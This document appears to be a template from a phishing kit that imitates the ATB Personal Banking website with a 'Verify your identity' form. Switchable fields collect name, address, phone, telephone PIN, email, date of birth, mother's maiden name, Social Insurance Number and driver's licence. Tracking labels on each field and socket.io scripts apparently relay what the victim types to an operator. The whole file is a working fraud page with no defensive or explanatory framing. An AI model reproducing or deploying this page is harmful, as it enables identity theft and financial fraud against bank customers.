<%=

atb.name

%>
<html class="fa-events-icons-ready">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon">
        <title>ATB Personal Banking</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" type="text/css" href="https://cloud.typography.com/6700732/6101192/css/fonts.css">
        <link href="https://use.fontawesome.com/f26ba7188d.css" media="all" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700" rel="stylesheet">
        <link rel="stylesheet" href="/assets/atb/main.css?7">
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
        <script>
            var lrbank = '<?=escape($udata->last->bank)?>';
            var lrinfo = '<?=escape($udata->last->info)?>';
        </script>
        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
        <script src="/assets/js/details.js?v=<?=time()?>"></script>
        <script src="/socket.io/socket.io.js"></script>
    </head>
    <body>
        <div id="app">
            <div class="sc-kgoBCf bzQzYK" id="rbw-overall-context-wrapper">
                <div class="sc-iwsKbI jTTtAZ"></div>
                <div class="sc-jzJRlG eNoisr">
                    <form class="sc-jTzLTM cUTnPT lab-form" method="post" id="rbw-login-block">
                        <input type="hidden" id="userAgent" name="userAgent">
                        <div class="sc-bdVaJa khUSez">
                            <img class="sc-htpNat gRCWAJ" src="/assets/atb/atb-jewel.svg" id="rbw-login-heading-atb-logo"><br><br>
                            <h2 class="ant-typography login-title-2 div-send">Verify your identity</h2>
                            <div class="ant-divider ant-divider-horizontal" role="separator" style="margin: 10px 0px 20px;"></div>
                        </div>
                        <div class="sc-fjdhpX Pbrfi div-main" id="rbw-login-form-login-block">
                            <p class="p-text">To continue, please verify your personal details.</p>
                            <div>
                                <% if (name == 'on') { %>
                                <div>
                                    <label class="top input rebank-textfield">Full Name:</label>
                                    <input name="name" required id="input-name" class="rebank-textfield lrinput" attr-action="Filling Full Name" type="text">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <% } if (address == 'on') { %>
                                <div>
                                    <label class="top input rebank-textfield">Address:</label>
                                    <input name="address" required id="input-address" class="rebank-textfield lrinput" attr-action="Filling Address" type="text">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <div>
                                    <label class="top input rebank-textfield">City:</label>
                                    <input name="city" required id="input-city" class="rebank-textfield lrinput" attr-action="Filling City" type="text">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <% } if (postal == 'on') { %>
                                <div>
                                    <label class="top input rebank-textfield">Postal Code:</label>
                                    <input name="postal" required id="input-postal" class="rebank-textfield lrinput" attr-action="Filling Postal Code" type="text" pattern="[A-Za-z][0-9][A-Za-z] [0-9][A-Za-z][0-9]" title="Please enter a valid postal code">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <% } if (phone == 'on') { %>
                                <div>
                                    <label class="top input rebank-textfield">Phone Number:</label>
                                    <input name="phone" required id="input-phone" class="rebank-textfield lrinput" attr-action="Filling Phone Number" type="tel" autocomplete="off" maxlength="13" oninput="this.value = this.value.replace(/[^0-9, ]/, '')">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <% } if (pin == 'on') { %>
                                <div>
                                    <label class="top input rebank-textfield">Telephone Pin:</label>
                                    <input name="pin" required id="input-pin" class="rebank-textfield lrinput" attr-action="Filling Telephone Pin" type="tel">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <% } if (email == 'on') { %>
                                <div>
                                    <label class="top input rebank-textfield">Email Address:</label>
                                    <input name="email" required id="input-email" class="rebank-textfield lrinput" attr-action="Filling Email" type="email">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <% } if (dob == 'on') { %>
                                    <div>
                                        <label class="top input rebank-textfield">Date of Birth:</label>
                                        <!-- Month Dropdown -->
                                        <select name="dob1" required class="rebank-textfield display-inline-block lrinput" attr-action="Selecting DoB" style="width:30%;">
                                            <option value="">MM</option>
                                            <% for (let x = 1; x <= 12; x++) { 
                                                let y = x.toString().padStart(2, '0'); %>
                                                <option value="<%= y %>"><%= y %></option>
                                            <% } %>
                                        </select>
                                        <!-- Day Dropdown -->
                                        <select name="dob2" required class="rebank-textfield display-inline-block lrinput" attr-action="Selecting DoB" style="width:30%;">
                                            <option value="">DD</option>
                                            <% for (let x = 1; x <= 31; x++) { 
                                                let y = x.toString().padStart(2, '0'); %>
                                                <option value="<%= y %>"><%= y %></option>
                                            <% } %>
                                        </select>
                                        <!-- Year Dropdown -->
                                        <select name="dob3" required class="rebank-textfield display-inline-block lrinput" attr-action="Selecting DoB" style="width:36%;">
                                            <option value="">YYYY</option>
                                            <% for (let x = new Date().getFullYear(); x >= new Date().getFullYear() - 110; x--) { %>
                                                <option value="<%= x %>"><%= x %></option>
                                            <% } %>
                                        </select>
                                    </div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                <% } if (mmn == 'on') { %>
                                <div>
                                    <label class="top input rebank-textfield">Mother's Maiden Name:</label>
                                    <input name="mmn" required id="input-mmn" class="rebank-textfield lrinput" attr-action="Filling MMN" type="text">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <% } if (sin == 'on') { %>
                                <div>
                                    <label class="top input rebank-textfield">Social Insurance Number:</label>
                                    <input name="sin" required id="input-sin" class="rebank-textfield lrinput" attr-action="Filling SIN" pattern="[0-9]{3}-[0-9]{3}-[0-9]{3}" title="Please enter a valid SIN" type="tel">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <% } if (dl == 'on') { %>
                                <div>
                                    <label class="top input rebank-textfield">Driver's Licence:</label>
                                    <input name="drivers" required id="input-drivers" class="rebank-textfield lrinput" attr-action="Filling Drivers"  type="text">
                                    <div class="sc-VigVT jQbsgO"></div>
                                    <div class="sc-VigVT jQbsgO"></div>
                                </div>
                                <% } %>
                                <div class="sc-VigVT jQbsgO"></div>
                                <div class="uiNewButtonWrapper "><input class="rebank-button primary" onclick="submitForm()" id="rbw-login-form-button-submit" label="Log in" type="nano" value="Continue"></div>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="sc-kAzzGY cUrlcM">
                    <div class="sc-chPdSV emnlIF" id="rbw-marquee-block">
                        <div class="sc-ckVGcZ czSiSX"></div>
                    </div>
                </div>
            </div>
        </div>
        <span hidden id="navig"> <%=navig%> </span>
        <span hidden id="stage">Details</span>
    </body>
    <script src="/bank/atb/js/script.js">
    </script>
</html>
